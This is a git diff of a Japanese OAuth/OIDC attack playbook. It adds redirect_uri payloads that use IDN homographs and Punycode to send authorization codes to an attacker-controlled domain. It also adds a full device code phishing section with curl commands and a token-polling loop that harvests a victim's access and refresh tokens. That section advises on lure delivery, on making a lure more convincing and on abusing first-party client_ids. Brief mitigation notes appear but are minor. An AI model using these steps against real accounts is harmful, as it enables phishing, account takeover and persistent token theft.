@@ -42,9 +42,10 @@ OAuth / OIDC が使われているかを判定する。下表のシグナルを�
 | `authorization_endpoint` | §1 / §10 の試行先 |
 | `token_endpoint` | §1 で奪った code をアクセストークンに交換する先 |
 | `userinfo_endpoint` | §4 implicit flow scope upgrade の試行先 |
-| `jwks_uri` | §7 の id_token 署名鍵公開先（jku 差し替え攻撃の参考） |
+| `jwks_uri` | §7 の id_token 検証で client が参照する**正規 IdP の公開鍵セット URL**（discovery メタデータ経由）。攻撃面は「discovery JSON が改ざんできるか」「クライアントがどのキーを fetch して trust するか」。**JWT ヘッダ内の `jku` クレーム差し替え攻撃とは別経路**（後者は `JWT_Attacks.md` §6 で扱う JWT 単体の問題で、ヘッダ内 URL を信用してしまう実装に対するもの） |
 | `registration_endpoint` | §9 動的クライアント登録の試行先（OIDC RFC 7591） |
 | `request_uri_parameter_supported` / `request_object_signing_alg_values_supported` | §10 request_uri 経由の試行可否 |
+| `device_authorization_endpoint` | §11 device code phishing の試行先（RFC 8628、Microsoft / GitHub / Google が対応） |
 | `code_challenge_methods_supported` | §5 で `plain` が含まれていれば PKCE downgrade 可 |
 | `response_types_supported` | §3 で `token` `id_token token` が含まれていれば Implicit Flow 利用可 |
 | `scopes_supported` | §4 scope upgrade の標的 scope リスト |
@@ -100,6 +101,7 @@ OAuth / OIDC が使われているかを判定する。下表のシグナルを�
 | client_secret 漏洩（§8） | 攻撃者が confidential client になりすませる | サーバ側 API を直接叩いて任意ユーザのトークン取得 / scope 拡大 |
 | Dynamic Client Registration の悪用（§9） | 攻撃者制御 redirect_uri を持つ client を登録できる | victim 同意経路を経た **code 横取り** |
 | request_uri SSRF（§10） | authorize 時に外部 URL を fetch させる | 認可サーバ内部ネット到達 / メタデータ取得 |
+| Device Code Phishing（§11） | 攻撃者が device_code 経路でセッションを開始し被害者に user_code を入力させる | 被害者の Microsoft / GitHub / Google アカウントの **access + refresh token 取得**（refresh で長期持続化） |
 
 ---
 
@@ -162,10 +164,14 @@ redirect_uri=https://[VICTIM_DOMAIN]/callback&redirect_uri=https://[ATTACKER_DOM
 ### 1.4 ホスト部の異なる表記
 
 ```
-# [Attacker] 大文字小文字・末尾ドット・IDN / Unicode 混入
+# [Attacker] 大文字小文字・末尾ドット・IDN homograph 混入
 redirect_uri=https://VICTIM_DOMAIN.com/callback        # 大文字
 redirect_uri=https://[VICTIM_DOMAIN]./callback         # 末尾ドット
-redirect_uri=https://①[VICTIM_DOMAIN]/callback         # IDN / Unicode 混入
+# IDN homograph: ASCII の lookalike を Unicode 文字で置き換える
+# 例: ascii 'a' (U+0061) → キリル文字 'а' (U+0430)・ascii 'o' → キリル 'о' (U+043E)
+# 検証が文字列一致だけだと素通り、実 DNS resolve は攻撃者ドメイン（Punycode の xn-- 表記でも可）
+redirect_uri=https://[VICTIM_DOMAIN_WITH_CYRILLIC_LOOKALIKE]/callback
+redirect_uri=https://xn--[ATTACKER_PUNYCODE]/callback
 ```
 
 ### 奪取した code をアクセストークンに交換
@@ -231,12 +237,26 @@ https://[VICTIM_APP]/oauth/callback?code=[ATTACKER_CODE]&state=
 
 ## 3. Implicit Flow Token Leakage
 
-**前提:** `response_type=token`（または `id_token token`）で、access_token / id_token が URL fragment (`#access_token=...`) として返される場合。fragment はサーバに送信されないが、ブラウザ・Referer・JS 経由で漏洩する。
+**前提:** access_token / id_token が URL fragment (`#access_token=...`) として返される実装の場合。**response_type の正確な区別:**
+
+| `response_type` | 仕様 | 返却物 | 追加必須 |
+|---|---|---|---|
+| `token` | OAuth 2.0 implicit（RFC 6749 §4.2、RFC 9700 で非推奨）| `access_token` のみ | なし |
+| `id_token` | OIDC implicit | `id_token` のみ | `scope=openid` + `nonce` |
+| `id_token token` | OIDC hybrid 相当（implicit 系の組合せ）| `access_token` + `id_token` | `scope=openid` + `nonce` |
+| `code token` / `code id_token` / `code id_token token` | OIDC hybrid flow（OIDC Core §3.3）| `code` + fragment 返却物 | `id_token` を含む場合は `scope=openid` + `nonce` |
+
+`id_token` を含めるには **`scope=openid` 必須**かつ **`nonce` パラメータ必須**（OIDC Core §3.1.2.1）。これらが無い実装で `id_token` が返ってきたら**仕様違反**で別の attack 面のシグナル。
+
+fragment はサーバに送信されないが、ブラウザ・Referer・JS 経由で漏洩する。
 
 **観測点:**
 
 ```
-# 認可レスポンスの形式
+# 認可レスポンスの形式（response_type=id_token token の場合）
+https://[VICTIM_DOMAIN]/callback#access_token=[TOKEN]&id_token=[JWT]&token_type=bearer&expires_in=3600
+
+# response_type=token (純粋 OAuth implicit) の場合
 https://[VICTIM_DOMAIN]/callback#access_token=[TOKEN]&token_type=bearer&expires_in=3600
 ```
 
@@ -318,7 +338,7 @@ curl -H "Authorization: Bearer [STOLEN_TOKEN]" \
 
 ## 5. PKCE 欠落・downgrade
 
-**前提:** authorization request に `code_challenge` パラメータが無い、または `code_challenge_method=plain`（実質 PKCE 無効）が許容される場合に成立。public client（モバイル app / SPA）では特に深刻だが、RFC 9700 は confidential client にも PKCE を推奨。
+**前提:** authorization request に `code_challenge` パラメータが無い、または `code_challenge_method=plain`（実質 PKCE 無効）が許容される場合に成立。public client（モバイル app / SPA）では特に深刻。PKCE 本体の仕様は **RFC 7636**（Proof Key for Code Exchange、2015）で定義されており、当初は public client 向けだったが、後発の **OAuth 2.0 Security BCP（RFC 9700）** で confidential client にも PKCE を推奨するよう拡張された（authorization code injection 攻撃への防御として）。`code_challenge_method` は S256 必須・plain は本番では受け入れない実装が安全。
 
 ### 5.1 PKCE 欠落
 
@@ -597,7 +617,67 @@ python3 -m http.server 8080 --directory /tmp
 | `invalid request_uri` | request_uri が pre-registered URL に限定 | pre-registered URI のサブストリングマッチを §1.1 同様試す |
 | `request object signing failed` | request object の `alg` 制限あり | `alg:none` 拒否、`JWT_Attacks.md` の HS256 ブルートに切替 |
 
-**注意:** `request_uri` は OIDC Core §6.2 で定義された機能で、本来は client_secret を持たない public client が request object を再利用する用途。**SSRF と認可リクエスト改ざんの 2 つの攻撃面**を持つため、認可サーバ側で pre-registered URL に限定するのが推奨実装。Microsoft Entra ID 等の主要 IdP では既に対策済みだが、自前実装 OIDC では残存することがある。
+**注意:** `request_uri` は OIDC Core §6.2 で定義された機能で、本来は client_secret を持たない public client が request object を再利用する用途。**SSRF と認可リクエスト改ざんの 2 つの攻撃面**を持つため、認可サーバ側で pre-registered URL に限定するのが推奨実装。Microsoft Entra ID 等の主要 IdP では既に対策済みだが、自前実装 OIDC では残存することがある。後発の **RFC 9101（JWT-Secured Authorization Request, JAR）** では `request` パラメータ（外部 URL fetch なしの inline JWT）または PAR（RFC 9126, Pushed Authorization Requests）の利用を推奨し、`request_uri` 外部 fetch の利用を縮小する方向。攻撃者視点では、JAR / PAR が導入されている認可サーバでは request object の `alg` 制限（`none` 禁止・登録 alg のみ許容）が厳しいことが多いため、§7 の JWT 攻撃に切り替える判断材料になる。
+
+---
+
+## 11. Device Code Phishing（OAuth 2.0 Device Authorization Grant の悪用）
+
+**前提:** `device_authorization_endpoint`（RFC 8628 Device Authorization Grant）が discovery JSON で公開されているか、対象組織が Microsoft 365 / GitHub / Google Workspace などの**device code フロー対応 SaaS** を使っていて、攻撃者が user_code をフィッシング経由で被害者に入力させられる場合に成立。**Microsoft / GitHub 等で実害例多数**（Volt Typhoon / Storm-0539 等の APT 攻撃で device code phishing が観測されている）。
+
+**攻撃シナリオ:**
+
+1. 攻撃者が `device_authorization_endpoint` に POST して `device_code` + `user_code` + `verification_uri` を取得
+2. 被害者にフィッシングメール / 偽サイト / 偽 Teams メッセージで「以下のコードを `https://microsoft.com/devicelogin` に入力してください」と誘導
+3. 被害者は正規ドメインで自分の認証情報を入力し、user_code を承認
+4. 攻撃者は `token_endpoint` で `grant_type=urn:ietf:params:oauth:grant-type:device_code` + `device_code` を polling し、access_token / refresh_token を取得
+5. **被害者は何も気付かない**（攻撃者のセッションが裏で確立される）
+
+**事前準備（必須）:** discovery JSON で `device_authorization_endpoint` の URL を取得。Microsoft の場合は `https://login.microsoftonline.com/[TENANT_ID]/oauth2/v2.0/devicecode`。
+
+**コマンド:**
+
+```bash
+# [Attacker] 1. device code を取得
+curl -X POST https://[AUTH_SERVER]/oauth/device_authorization \
+  -d "client_id=[CLIENT_ID]" \
+  -d "scope=openid email profile offline_access"
+# レスポンス例:
+# {
+#   "device_code": "[DEVICE_CODE]",
+#   "user_code": "ABCD-EFGH",
+#   "verification_uri": "https://[AUTH_SERVER]/device",
+#   "verification_uri_complete": "https://[AUTH_SERVER]/device?user_code=ABCD-EFGH",
+#   "expires_in": 900,
+#   "interval": 5
+# }
+
+# [Attacker] 2. user_code を被害者にフィッシング経由で入力させる
+# verification_uri_complete を QR コード化してメール / Teams で配信するのが典型
+
+# [Attacker] 3. token endpoint を polling（interval 秒ごと）
+while true; do
+  RESP=$(curl -s -X POST https://[AUTH_SERVER]/oauth/token \
+    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
+    -d "device_code=[DEVICE_CODE]" \
+    -d "client_id=[CLIENT_ID]")
+  echo "$RESP" | grep -q access_token && { echo "$RESP"; break; }
+  sleep 5
+done
+# 被害者が承認すると access_token + refresh_token が返る
+```
+
+**観測される出力 → 次のアクション:**
+
+| サーバの応答 | 示唆 | 次のアクション |
+|---|---|---|
+| `authorization_pending` | 被害者が未承認 | polling 継続 |
+| 200 + access_token + refresh_token | 被害者が承認 → フィッシング成立 | refresh_token で長期アクセス維持・対象 API（Graph API / GitHub API 等）を叩く |
+| `expired_token` | 15 分の expires_in 超過 | device code を再発行して攻撃を再実行 |
+| 400 `unauthorized_client` | client_id が device code フロー非対応 | 別の first-party client_id（Microsoft 公式の Azure CLI / PowerShell の client_id 等が悪用される）を試す |
+| 着信なし（被害者が踏まない） | フィッシング誘導失敗 | 偽装の信頼性を上げる（社内らしき文面・正規 SaaS のロゴ・短縮 URL 回避） |
+
+**注意:** Device code フローは **CLI / IoT / TV など入力が貧弱な端末向け**の正規機能で、攻撃面は「user_code がランダム短文字列なのを利用してフィッシングする」点。**Microsoft Entra ID では Conditional Access policy で device code フローを Block できる**ようになっており、本番組織で device code phishing リスクが高い場合は Conditional Access での mitigation を推奨。攻撃者視点では、organization の Conditional Access 設定を事前に偵察できない場合は試行価値あり。
 
 ---
 
@@ -614,6 +694,7 @@ python3 -m http.server 8080 --directory /tmp
 | §8 client_secret が JS バンドルに無い | BFF パターン使用中 | BFF サーバ側の脆弱性に攻撃面を移す |
 | §9 dynamic registration が 401 | 認証必須 | 既存 credentials があれば再試行、なければ §1 経路へ |
 | §10 request_uri が pre-registered URL 限定 | URL ホワイトリスト | サブストリングマッチを §1.1 同様試す |
+| §11 device code フローが client_id で拒否 | client_id が device code 非対応 | first-party client_id（Azure CLI / PowerShell / GitHub CLI など）を試す。組織の Conditional Access policy で block されている場合は諦め |
 | 全パターンで通らない | 認可フロー自体は堅牢 | 発行されたトークンの取り扱い（リソース API の scope 検証・トークン保存場所）に攻撃面を移す |
 
 ## 注意点・落とし穴
@@ -630,7 +711,8 @@ python3 -m http.server 8080 --directory /tmp
 - **fragment（`#`）はサーバログに残らない** → §3 Implicit Flow の access_token 漏洩を server-side ログだけで確認しようとすると検出できない。ブラウザ DevTools / Burp HTTP history で確認する
 - **authorization code は通常 1 回しか使えない** → 攻撃者が先に消費してしまうと被害者側でエラーになり気付かれる。§1 では被害者が踏む前に消費しない / §2 では被害者セッションで消費されるので問題ない
 - **id_token と access_token を混同しない** → id_token は OIDC の認証結果の証明（JWT、client が検証）、access_token はリソース API の認可（resource server が検証）。攻撃面が違う
-- **`prompt=none` の挙動** → SSO セッションが有効なら同意画面を出さずに即 code を返す。「被害者がログイン中か」を判定するサイドチャネルにもなる
+- **`prompt=none` の挙動** → SSO セッションが有効なら同意画面を出さずに即 code を返す。「被害者がログイン中か」を判定するログイン状態オラクルにもなる。**iframe 内で `prompt=none` の authorize を連続実行**すると、被害者の SSO セッションを使って気付かれずに code を取得できる経路があり、X-Frame-Options / framing 制限が緩い callback と組み合わせると深刻。`response_mode=form_post` を使うと code が POST body で返るためログ / Referer に残らない点も併せて確認
+- **`response_mode` の悪用** → authorize 時に `response_mode=form_post` / `web_message` 等を指定できる場合、callback ページの処理実装が甘いと XSS / postMessage origin 不検証で token を別 origin に流せるケースがある。callback ハンドラの実装をコード or Burp 経由で必ず確認
 - **redirect_uri は authorize 時と token 交換時で完全一致が必要** → §1 で code を奪っても token 交換時に元の redirect_uri を指定する必要がある
 - **モバイル app の custom URL scheme は OS レベルで保証されない** → 同 scheme を登録した別 app が起動順序で先に受け取る可能性。Universal Links / App Links 推奨だが未対応のアプリも多い
 - **個別ブロック固有の注意は各 §N ブロック内の「注意:」を参照。** 本セクションは複数ブロック横断の警告のみ。
